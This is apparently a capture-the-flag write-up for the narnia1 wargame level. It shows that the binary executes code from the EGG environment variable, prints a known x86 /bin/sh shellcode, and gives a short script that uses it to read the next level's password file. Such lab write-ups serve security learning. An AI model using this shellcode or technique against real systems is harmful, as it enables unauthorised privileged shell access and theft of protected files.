# narnia1

`/narnia/narnia1` can be exploited by executing [shellcode](https://en.wikipedia.org/wiki/Shellcode) in a vulnerable environment variable.

## Aim

Set the environment variable `EGG` to something `narnia1` can execute and we can exploit.

## Analysis

`narnia1.c` is pretty clear that it will try to read end execute the environment variable `EGG`.

```c
ret = getenv("EGG");
ret();
```

This gives us complete freedom to insert whatever arbitary code we like in memory before running the program. The code will need to be raw assembly.

## Exploitation
### Design

The easiest and simplest arbitary code is a [shellcode](https://en.wikipedia.org/wiki/Shellcode) which provides shell access (with the implicit priviliges of the parent program).

### Implementation

A quick Google search reveals a known shellcode for Intel processors (your architecture may be different).

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80
```

Environment variables are set with `export` to make them available to child processes.

```bash
export EGG="$SHELLCODE"
```

Putting it all together:

```bash
#!/bin/sh

# Eggshell is assembly code that simply calls a shell
EGGSHELL="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

# Set our arbitary code to execute in EGG
export EGG=$(printf "$EGGSHELL") && \

# Our command to run once we have an escalated shell
printf "cat /etc/narnia_pass/narnia2\n" | \

# Pass exploit to the program
/narnia/narnia1
```
